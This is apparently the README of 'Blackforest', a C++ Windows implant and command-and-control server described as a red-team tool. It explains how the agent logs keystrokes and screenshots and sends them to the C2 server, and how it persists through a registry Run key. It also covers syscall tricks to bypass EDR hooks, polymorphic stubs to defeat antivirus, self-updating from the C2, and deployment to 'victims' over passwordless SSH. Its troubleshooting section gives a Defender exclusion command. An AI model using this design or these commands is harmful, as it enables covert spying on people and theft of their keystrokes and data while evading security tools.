# 🌲 Blackforest: Advanced Red Team Implant

> **⚠️ DISCLAIMER**: This software is for **Educational Use and Authorized Red Teaming ONLY**. Usage against systems without prior mutual consent is illegal. The author assumes no liability for misuse.

## 1. Project Overview
**Blackforest** is a state-of-the-art C++ implant designed for covert operations, persistence, and specialized data exfiltration. It features a custom **Polymorphic Engine**, **Indirect Syscall execution**, and a robust **Multi-User Command & Control (C2) Team Server**.

Unlike basic reverse shells, Blackforest is fully autonomous. It handles its own persistence, updates itself automatically via HTTP polling, and maintains a "Persistent Socket" connection for real-time, low-latency control.

---

## 2. Architecture & Theory

### System Design
Blackforest is composed of three distinct layers:

```mermaid
graph TD
    User["👑 Prior (You)"] -->|Deploy| Dropper["� Dropper (SSH)"]
    Dropper -->|Execute| Agent["🕷️ Agent (Detached)"]
    
    subgraph "Agent Lifecycle"
        Agent -->|1. Check| Mutex["🔒 Singleton Check"]
        Mutex -->|2. Install| Registry["� Registry Run Key"]
        Mutex -->|3. Evasion| Poly["🧬 Polymorphic Stub"]
        
        Poly -->|4. Loop| C2Loop{{"🌐 C2 Connection"}}
        
        C2Loop --"Connected"--> Work["⚡ Execute Tasks"]
        Work -->|Keylogs/Screens| C2Loop
        
        C2Loop --"Disconnected"--> Sleep["� Sleep & Retry"]
        Sleep --> C2Loop
    end
```



### Data Exfiltration Pipeline

```mermaid
sequenceDiagram
    participant K as ⌨️ Keyboard
    participant H as 🪝 Hook (Agent)
    participant B as 📦 Buffer
    participant N as 🔌 TCP Client
    participant S as 💻 C2 Server

    K->>H: Press 'A'
    H->>B: Add "A"
    
    opt Buffer Full or Timeout
        B->>N: Flush Data
        N->>N: � Encrypt Packet
        N->>S: Send (Persistent Socket)
        S-->>N: ACK
    end
```



### Core Technologies

#### A. Persistent Networking (Keep-Alive)
Standard implants open a new socket for every packet, creating "noise" in network logs.
*   **Blackforest** uses a single **RAII-managed Persistent Socket**.
*   It connects once and stays connected.
*   **Self-Healing**: If the connection drops (Wi-Fi loss, sleep mode), the agent automatically enters a reconnection loop until the C2 is reachable again.

#### B. Polymorphic Evasion
To defeat signature-based antivirus:
1.  **Syscall Spoofing**: The agent does not call Windows APIs (`WriteProcessMemory`) directly. It manually invokes syscalls using assembly, bypassing user-mode EDR hooks (`jmp rax`).
2.  **String Encryption**: All sensitive strings are XOR-encrypted at compile time and decrypted only in memory when needed.
3.  **Polymorphic Stub**: On every build, the `PolymorphicEngine` generates a unique "junk code" stub that alters the binary's hash signature.

#### C. Loop-Proof Auto-Update
The agent pulls its own updates without operator intervention:
1.  Polls `http://C2:8000/update.txt` every 60 seconds.
2.  Checks the logic: `RemoteHash == LocalHash`.
3.  **Safety**: If the file size/hash is identical, it sleeps. It **only** updates when code actually changes, preventing infinite restart loops.

---

## 3. Installation & Usage

### Step 1: Start the Team Server
We have unified the Shell and Data listeners into a single dashboard.
```bash
python3 c2/server.py
```
*   **Port 4445**: Interactive Shells.
*   **Port 4444**: Data Stream (Keylogs/Screenshots).
*   **Port 8000**: Update Distribution.

### Step 2: Compile & Deploy
We use an **Automated CI/CD Pipeline**. You do not need to compile manually.

**To Update/Deploy:**
```bash
scripts/build.sh   # Compiles new binary to bin/Blackforest.exe
scripts/deploy.sh  # Uploads & Runs on Victim (Passwordless)
```
*(Run `scripts/setup_ssh.sh` once first if you haven't set up keys).*

### Step 3: Operate
Inside the `c2/server.py` dashboard:
*   `list`: View active victims.
*   `interact <ID>`: Enter a victim's shell.
*   **Keylogs**: Appear automatically in the terminal logging file (clean output).

---

## 4. Operational Security (OPSEC)

### Persistence
The agent installs itself to multiple locations to ensure survival:
1.  **Registry**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` -> `BlackforestUpdater`.
2.  **File System**: `%APPDATA%\Blackforest\Blackforest.exe`.
3.  **Process State**: Runs as a **Detached Process** (`CREATE_NO_WINDOW`). Closing the parent console (SSH) does **not** kill the agent.

### Identity Isolation
*   **Constraint**: Keyloggers can only capture keys from the **current user context**.
*   **Fix**: If you deploy as user `Avengers` via SSH, but the target user is actively typing as `Admin`, you will not see keys. You must execute the agent **as the target user**.

---

## 5. Troubleshooting

| Issue | Cause | Fix |
| :--- | :--- | :--- |
| **"Access Denied"** | Defender blocked the file. | `Add-MpPreference -ExclusionPath ...` |
| **No Keylogs** | Wrong User Context. | Ensure `whoami` matches the physical user. |
| **Log Spam** | Old Listener. | Restart `c2/server.py`. |
| **SSH Closes Agent** | Old Binary. | Run `./build.sh` (Fixes Detachment). |

---

*🌲 SpyWare 🌲*

### 5. Emergency: Remote Kill Switch
To immediately self-destruct all active agents:
1.  **Stop C2 Server**.
2.  Edit `update.txt` in your web root (or served by C2).
3.  Replace content with the **Kill Key**:
    ```text
    09827a801ea931cdacf6ee8828b3283add9e694764a8c0aea06f73b9eed66d22
    ```
4.  **Wait 60 seconds**.
5.  All agents will:
    *   Detect the Kill Key.
    *   Remove Registry Persistence (`HKCU...Run`).
    *   Delete their own executable (`Melting`).
    *   Terminate immediately.

---
